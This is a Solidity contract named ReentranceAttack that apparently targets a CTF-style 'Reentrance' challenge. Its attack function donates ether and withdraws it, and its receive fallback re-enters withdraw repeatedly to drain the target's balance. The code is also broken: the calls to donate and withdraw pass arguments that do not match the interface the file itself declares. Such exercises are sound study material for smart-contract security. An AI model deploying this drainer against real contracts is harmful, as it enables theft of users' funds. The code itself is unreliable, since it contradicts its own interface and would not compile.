// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface  IReentrance {
    function donate (uint _amount) external payable;
    function withdraw () external;

    
}
contract ReentranceAttack {
    IReentrance public target;

    constructor(address _target) {
        target = IReentrance(_target);

    }
    function attack() external  payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }
    receive () external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }
}
